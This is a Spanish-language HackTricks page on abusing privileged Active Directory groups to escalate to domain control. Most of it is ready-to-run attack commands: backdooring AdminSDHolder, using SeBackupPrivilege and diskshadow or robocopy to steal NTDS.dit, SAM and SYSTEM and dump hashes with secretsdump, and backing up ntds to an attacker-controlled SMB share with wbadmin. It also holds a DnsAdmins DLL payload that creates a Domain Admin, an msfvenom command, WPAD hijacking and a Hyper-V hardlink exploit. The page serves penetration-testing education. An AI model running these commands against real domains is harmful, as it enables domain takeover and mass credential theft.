# Grupos Privilegiados

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Grupos conocidos con privilegios de administración

* **Administradores**
* **Domain Admins**
* **Enterprise Admins**

Existen otras membresías de cuenta y privilegios de token de acceso que también pueden ser útiles durante las evaluaciones de seguridad al encadenar múltiples vectores de ataque.

## Operadores de Cuenta <a href="#account-operators" id="account-operators"></a>

* Permite crear cuentas y grupos no administradores en el dominio
* Permite iniciar sesión localmente en el DC

Obtener **miembros** del grupo:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Tenga en cuenta la membresía del usuario 'spotless':

![](<../../.gitbook/assets/1 (2) (1) (1).png>)

Sin embargo, aún podemos agregar nuevos usuarios:

![](../../.gitbook/assets/a2.png)

Así como iniciar sesión localmente en DC01:

![](../../.gitbook/assets/a3.png)

## Grupo AdminSDHolder

La Lista de Control de Acceso (ACL) del objeto **AdminSDHolder** se utiliza como plantilla para **copiar** **permisos** a **todos los "grupos protegidos"** en Active Directory y sus miembros. Los grupos protegidos incluyen grupos privilegiados como Domain Admins, Administrators, Enterprise Admins y Schema Admins.\
Por defecto, la ACL de este grupo se copia dentro de todos los "grupos protegidos". Esto se hace para evitar cambios intencionales o accidentales en estos grupos críticos. Sin embargo, si un atacante modifica la ACL del grupo **AdminSDHolder**, por ejemplo otorgando permisos completos a un usuario regular, este usuario tendrá permisos completos en todos los grupos dentro del grupo protegido (en una hora).\
Y si alguien intenta eliminar a este usuario de los Domain Admins (por ejemplo) en una hora o menos, el usuario volverá al grupo.

Obtener **miembros** del grupo:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
```
Agregar un usuario al grupo **AdminSDHolder**:
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```
Compruebe si el usuario está dentro del grupo **Domain Admins**:
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Si no quieres esperar una hora, puedes usar un script de PS para hacer que la restauración ocurra instantáneamente: [https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)

[**Más información en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

## **Papelera de Reciclaje de AD**

Este grupo te da permiso para leer objetos de AD eliminados. Se puede encontrar información valiosa allí:
```bash
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Acceso al Controlador de Dominio

Observa cómo no podemos acceder a archivos en el DC con la membresía actual:

![](../../.gitbook/assets/a4.png)

Sin embargo, si el usuario pertenece a `Server Operators`:

![](../../.gitbook/assets/a5.png)

La historia cambia:

![](../../.gitbook/assets/a6.png)

### Escalada de Privilegios <a href="#backup-operators" id="backup-operators"></a>

Utiliza [`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) o `sc`, de Sysinternals, para verificar permisos en un servicio.
```
C:\> .\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

[...]

[ALLOW] BUILTIN\Server Operators
All
```
Este confirma que el grupo Server Operators tiene el derecho de acceso [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), lo que nos otorga control total sobre este servicio.
Puedes abusar de este servicio para [**hacer que el servicio ejecute comandos arbitrarios**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#modify-service-binary-path) y escalar privilegios.

## Backup Operators <a href="#backup-operators" id="backup-operators"></a>

Al igual que con la membresía de `Server Operators`, podemos **acceder al sistema de archivos de `DC01`** si pertenecemos a `Backup Operators`.

Esto se debe a que este grupo otorga a sus **miembros** los privilegios [**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) y [**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5). El **SeBackupPrivilege** nos permite **atravesar cualquier carpeta y listar** el contenido de la carpeta. Esto nos permitirá **copiar un archivo de una carpeta,** incluso si no tienes permisos para nada más. Sin embargo, para abusar de estos permisos y copiar un archivo se debe usar la bandera [**FILE\_FLAG\_BACKUP\_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) \*\*\*\*. Por lo tanto, se necesitan herramientas especiales.

Para este propósito puedes usar [**estos scripts**](https://github.com/giuliano108/SeBackupPrivilege)**.**

Obtener **miembros** del grupo:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### **Ataque Local**
```bash
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# List Admin folder for example and steal a file
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
```
### Ataque a AD

Por ejemplo, puedes acceder directamente al sistema de archivos del Controlador de Dominio:

![](../../.gitbook/assets/a7.png)

Puedes abusar de este acceso para **robar** la base de datos del directorio activo **`NTDS.dit`** para obtener todos los **hashes NTLM** de todos los objetos de usuario y computadora en el dominio.

#### Usando diskshadow.exe para volcar NTDS.dit

Utilizando [**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) puedes **crear una copia de sombra** del **disco `C`** y en el disco `F` por ejemplo. Luego, puedes robar el archivo `NTDS.dit` de esta copia de sombra ya que no estará en uso por el sistema:
```
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 10:34:16 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% F:
DISKSHADOW> end backup
DISKSHADOW> exit
```
Como en el ataque local, ahora puedes copiar el archivo privilegiado **`NTDS.dit`**:
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Otra forma de copiar archivos es utilizando [**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)**:**
```
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
Entonces, puedes fácilmente **robar** el **SYSTEM** y **SAM**:
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
Finalmente puedes **obtener todos los hashes** del **`NTDS.dit`**:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Uso de wbadmin.exe para volcar NTDS.dit

El uso de wbadmin.exe es muy similar a diskshadow.exe, la utilidad wbadmin.exe es una herramienta de línea de comandos integrada en Windows, desde Windows Vista/Server 2008.

Antes de usarla, necesitas [**configurar el sistema de archivos ntfs para el servidor smb**](https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801) en la máquina atacante.

Cuando hayas terminado de configurar el servidor smb, necesitas almacenar en caché las credenciales smb en la máquina objetivo:
```
# cache the smb credential.
net use X: \\<AttackIP>\sharename /user:smbuser password

# check if working.
dir X:\
```
Si no hay error, utilice wbadmin.exe para explotarlo:
```
# Start backup the system.
# In here, no need to use `X:\`, just using `\\<AttackIP>\sharename` should be ok.
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds

# Look at the backup version to get time.
wbadmin get versions

# Restore the version to dump ntds.dit.
echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```
Si tiene éxito, volcará en `C:\ntds.dit`.

[VIDEO DEMO CON IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)

## DnsAdmins

Un usuario que es miembro del grupo **DNSAdmins** o tiene **privilegios de escritura en un objeto de servidor DNS** puede cargar una **DLL arbitraria** con privilegios de **SYSTEM** en el **servidor DNS**.\
Esto es realmente interesante ya que los **Controladores de Dominio** se **usan** muy frecuentemente como **servidores DNS**.

Como se muestra en este [**post**](https://adsecurity.org/?p=4064), el siguiente ataque se puede realizar cuando DNS se ejecuta en un Controlador de Dominio (lo cual es muy común):

* La gestión de DNS se realiza a través de RPC
* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) nos permite **cargar** una **DLL** personalizada con **cero verificación** de la ruta de la DLL. Esto se puede hacer con la herramienta `dnscmd` desde la línea de comandos
* Cuando un miembro del grupo **`DnsAdmins`** ejecuta el comando **`dnscmd`** a continuación, la clave del registro `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` se llena
* Cuando se **reinicia el servicio DNS**, la **DLL** en esta ruta será **cargada** (es decir, una compartición de red a la que la cuenta de máquina del Controlador de Dominio puede acceder)
* Un atacante puede cargar una **DLL personalizada para obtener una shell inversa** o incluso cargar una herramienta como Mimikatz como una DLL para volcar credenciales.

Obtener **miembros** del grupo:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Ejecutar DLL arbitraria

Entonces, si tienes un usuario dentro del **grupo DNSAdmins**, puedes hacer que el **servidor DNS cargue una DLL arbitraria con privilegios SYSTEM** (el servicio DNS se ejecuta como `NT AUTHORITY\SYSTEM`). Puedes hacer que el servidor DNS cargue un archivo DLL **local o remoto** (compartido por SMB) ejecutando:
```
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
```
Un ejemplo de una DLL válida se puede encontrar en [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL). Yo cambiaría el código de la función `DnsPluginInitialize` a algo como:
```c
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```
O podrías generar una dll usando msfvenom:
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Entonces, cuando el **DNSservice** se inicia o reinicia, se creará un nuevo usuario.

Incluso teniendo un usuario dentro del grupo DNSAdmin, **por defecto no puedes detener y reiniciar el servicio DNS.** Pero siempre puedes intentar hacer:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
[**Aprende más sobre esta escalada de privilegios en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

#### Mimilib.dll

Como se detalla en este [**post**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), también es posible usar [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) del creador de la herramienta `Mimikatz` para obtener ejecución de comandos **modificando** el archivo [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) \*\*\*\* para ejecutar un **reverse shell** de una línea u otro comando de nuestra elección.

### Registro WPAD para MitM

Otra forma de **abusar de los privilegios del grupo DnsAdmins** es creando un **registro WPAD**. La membresía en este grupo nos da los derechos para [desactivar la seguridad de bloqueo de consultas globales](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), que por defecto bloquea este ataque. Server 2008 introdujo por primera vez la capacidad de añadir a una lista de bloqueo de consultas globales en un servidor DNS. Por defecto, el Protocolo de Descubrimiento Automático de Proxy Web (WPAD) y el Protocolo de Direccionamiento Automático de Túnel entre Sitios (ISATAP) están en la lista de bloqueo de consultas globales. Estos protocolos son bastante vulnerables al secuestro, y cualquier usuario del dominio puede crear un objeto de computadora o registro DNS que contenga esos nombres.

Después de **desactivar la lista de bloqueo de consultas globales** y crear un **registro WPAD**, **cada máquina** que ejecute WPAD con la configuración predeterminada tendrá su **tráfico enrutado a través de nuestra máquina de ataque**. Podríamos usar una herramienta como \*\*\*\* [**Responder**](https://github.com/lgandx/Responder) **o** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **para realizar spoofing de tráfico**, e intentar capturar hashes de contraseñas y descifrarlas fuera de línea o realizar un ataque SMBRelay.

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Lectores de Registros de Eventos

Los miembros del grupo [**Lectores de Registros de Eventos**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) \*\*\*\* tienen **permiso para acceder a los registros de eventos** generados (como los registros de creación de nuevos procesos). En los registros se podría encontrar **información sensible**. Veamos cómo visualizar los registros:
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Event Log Readers"

# To find "net [...] /user:blahblah password"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Using other users creds
wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findstr "/user"

# Search using PowerShell
Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
## Permisos de Exchange en Windows

Los miembros tienen la capacidad de **escribir una DACL en el objeto de dominio**. Un atacante podría abusar de esto para **darle a un usuario** [**DCSync**](dcsync.md) privilegios.\
Si Microsoft Exchange está instalado en el entorno de AD, es común encontrar cuentas de usuario e incluso computadoras como miembros de este grupo.

Este [**repositorio de GitHub**](https://github.com/gdedrouas/Exchange-AD-Privesc) explica algunas **técnicas** para **escalar privilegios** abusando de los permisos de este grupo.
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Administradores de Hyper-V

El grupo [**Administradores de Hyper-V**](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) tiene acceso completo a todas las [funciones de Hyper-V](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines). Si los **Controladores de Dominio** han sido **virtualizados**, entonces los **administradores de virtualización** deben ser considerados **Administradores de Dominio**. Podrían fácilmente **crear un clon del Controlador de Dominio en vivo** y **montar** el **disco virtual** de forma offline para obtener el archivo **`NTDS.dit`** y extraer los hashes de contraseña NTLM de todos los usuarios en el dominio.

También está bien documentado en este [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), que al **eliminar** una máquina virtual, `vmms.exe` intenta **restaurar los permisos originales del archivo** en el correspondiente archivo **`.vhdx`** y lo hace como `NT AUTHORITY\SYSTEM`, sin suplantar al usuario. Podemos **eliminar el archivo `.vhdx`** y **crear** un **enlace físico nativo** para que este archivo apunte a un **archivo protegido del SYSTEM**, y se nos otorgarán permisos completos.

Si el sistema operativo es vulnerable a [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) o [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), podemos aprovechar esto para obtener privilegios de SYSTEM. De lo contrario, podemos intentar **aprovechar una aplicación en el servidor que haya instalado un servicio que se ejecute en el contexto de SYSTEM**, que pueda ser iniciado por usuarios no privilegiados.

### **Ejemplo de Explotación**

Un ejemplo de esto es **Firefox**, que instala el **`Mozilla Maintenance Service`**. Podemos actualizar [este exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (una prueba de concepto para enlace físico NT) para otorgar a nuestro usuario actual permisos completos en el archivo a continuación:
```bash
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **Tomando posesión del archivo**

Después de ejecutar el script de PowerShell, deberíamos tener **control total de este archivo y podemos tomar posesión de él**.
```bash
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **Iniciando el Mozilla Maintenance Service**

A continuación, podemos reemplazar este archivo con un **`maintenanceservice.exe` malicioso**, **iniciar** el servicio de mantenimiento y obtener ejecución de comandos como SYSTEM.
```
C:\htb> sc.exe start MozillaMaintenance
```
{% hint style="info" %}
Este vector ha sido mitigado por las actualizaciones de seguridad de Windows de marzo de 2020, que cambiaron el comportamiento relacionado con los enlaces duros.
{% endhint %}

## Gestión de la Organización

Este grupo también está en entornos con **Microsoft Exchange** instalado.\
los miembros de este grupo pueden **acceder** a los **buzones** de **todos** los usuarios del dominio.\
Este grupo también tiene **control total** de la OU llamada `Microsoft Exchange Security Groups`, que contiene el grupo [**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions) \*\*\*\* (sigue el enlace para ver cómo abusar de este grupo para escalar privilegios).

## Operadores de Impresión

A los miembros de este grupo se les otorga:

* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
* **Iniciar sesión localmente en un Controlador de Dominio** y apagarlo
* Permisos para **gestionar**, crear, compartir y eliminar **impresoras conectadas a un Controlador de Dominio**

{% hint style="warning" %}
Si el comando `whoami /priv`, no muestra el **`SeLoadDriverPrivilege`** desde un contexto no elevado, necesitas eludir UAC.
{% endhint %}

Obtener **miembros** del grupo:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Revise en esta página cómo abusar del SeLoadDriverPrivilege para privesc:

{% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
[abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
{% endcontent-ref %}

## Usuarios de Escritorio Remoto

Los miembros de este grupo pueden acceder a los PC a través de RDP.\
Obtenga **miembros** del grupo:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Más información sobre **RDP**:

{% content-ref url="../../network-services-pentesting/pentesting-rdp.md" %}
[pentesting-rdp.md](../../network-services-pentesting/pentesting-rdp.md)
{% endcontent-ref %}

## Usuarios de Administración Remota

Los miembros de este grupo pueden acceder a PCs a través de **WinRM**.
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Más información sobre **WinRM**:

{% content-ref url="../../network-services-pentesting/5985-5986-pentesting-winrm.md" %}
[5985-5986-pentesting-winrm.md](../../network-services-pentesting/5985-5986-pentesting-winrm.md)
{% endcontent-ref %}

## Operadores de Servidor <a href="#server-operators" id="server-operators"></a>

La membresía en este grupo permite a los usuarios configurar Controladores de Dominio con los siguientes privilegios:

* Permitir inicio de sesión local
* Hacer copia de seguridad de archivos y directorios
* \`\`[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) y [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)
* Cambiar la hora del sistema
* Cambiar la zona horaria
* Forzar apagado desde un sistema remoto
* Restaurar archivos y directorios
* Apagar el sistema
* Controlar servicios locales

Obtener **miembros** del grupo:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Referencias <a href="#references" id="references"></a>

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
